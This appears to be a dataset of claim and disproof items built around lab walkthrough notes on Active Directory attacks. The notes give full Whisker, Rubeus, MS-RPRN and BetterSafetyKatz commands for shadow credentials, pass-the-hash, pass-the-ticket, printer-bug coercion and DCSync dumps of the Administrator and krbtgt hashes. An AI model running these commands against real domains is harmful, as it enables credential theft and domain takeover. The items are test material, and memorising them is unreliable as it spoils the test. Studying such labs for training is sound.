items.claim: Shadow credentials convert a write-capable ACL on a user into that user's NTLM hash: planting a certificate-backed credential on the msDS-KeyCredentialLink attribute and asking the KDC for a TGT with it returns the hash without ever knowing the password.
items.body:
Shadow credentials convert a write-capable ACL on a user into that user's NTLM hash: planting a certificate-backed credential on the msDS-KeyCredentialLink attribute and asking the KDC for a TGT with it returns the hash without ever knowing the password.

HackTricks reference: e20cb272 (notion:e20cb272-c1da-42e3-9040-7266489e0ebf)
items.disproof: The attribute cannot be written on the target user, or the certificate-authenticated TGT request returns no NTLM hash for that account.

tealhAbusing Shadow Credentials

1) Enumerating Interesting ACLs

Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "Studentusers"}

Untitled

Please Notice that student Users have generic All on the Support36User

2) let’s add shadow credentials to it

 .\Whisker.exe add /target:Support36User

Untitled

The shadow credentials have been added to the target user and we got the Rubeus Command that we need to abuse it

3) Checking is the user have the msds-keycredentiallink attribute set 

Get-DomainUser -Identity Support36User

Untitled

It’s indeed set on

4) Now let’s abuse the shadow credentials to get the NTLM hash of the user

Rubeus.exe asktgt /user:Support36User /certificate: /password:"YvY36AfCRYo24CAw" /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /getcredentials /show

Untitled

5) Now let’s try to OverPass-The-Hash

.\Rubeus.exe asktgt /user:Support36User /domain:us.techcorp.local /rc4:3D441B1832BD67688C191C7C63CCCBB4 /ptt

Untitled

Notice that we got the Support36User ticket

6) List the ticket to validate

klist

Untitled

Finally We got it

Another way to abuse the shadow credentials is just to Pass-The-Ticket from with the certificate added

.\Rubeus.exe asktgt /user:Support36User /certificate: /password:"YvY36AfCRYo24CAw" /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /ptt /show

Untitled

Notice that the ticket imported successfully we just removed the /getcredentials and replace it with /ptt

Now let’s validate the ticket

klist

Untitled

And we Sure Got it

This lab looks at leveraging machine account NTLM password hashes or more specifically - how they can be used in pass the hash attacks to gain additional privileges, depending on which groups the machine is a member of (ideally administrators/domain administrators).

items.claim: Coercing a domain controller that has unconstrained delegation enabled with a printerbug forces it to hand out a TGT to the attacker, which is then replayed as a pass-the-ticket and confirmed by the local ticket list.
items.body:
Coercing a domain controller that has unconstrained delegation enabled with a printerbug forces it to hand out a TGT to the attacker, which is then replayed as a pass-the-ticket and confirmed by the local ticket list.

HackTricks reference: c5573d3d (notion:c5573d3d-ce58-4bd5-b75a-109dbe085fe0)
items.disproof: No TGT appears in the monitor after the coercion, or the local ticket list still shows no imported ticket after the pass-the-ticket step.

We will learn how to abuse unconstrained delegation across forest

First checking if TGTDelegation is enabled

Open Rubeus.exe in monitoring mode

.\Rubeus.exe monitor /target:usvendor-dc$ /interval:5 /nowrap

Untitled

Now let’s Abuse the printerbug

MS-RPRN.exe \\usvendor-dc.usvendor.local \\us-web.us.techcorp.local

Untitled

Now let’s go and check Rubeus.exe

Untitled

we got the usvendor-dc ticket

Let’s use Rubeus.exe to perform Pass-The-Ticket

.\Rubeus.exe ptt /ticket:

Untitled

Now let’s list the tickets to validate

klist

As observed we got it

Let’s perform DCSync and extract the admin hash

.\BetterSafetyKatz.exe "lsadump::dcsync /user:usvendor\Administrator /domain:usvendor.local" "exit"

And we got the administrator hash

Let’s perform DCSync and extract the krbtgt hash

.\BetterSafetyKatz.exe "lsadump::dcsync /user:usvendor\krbtgt /domain:usvendor.local" "exit"

Untitled

And we got the Krbtgt hash
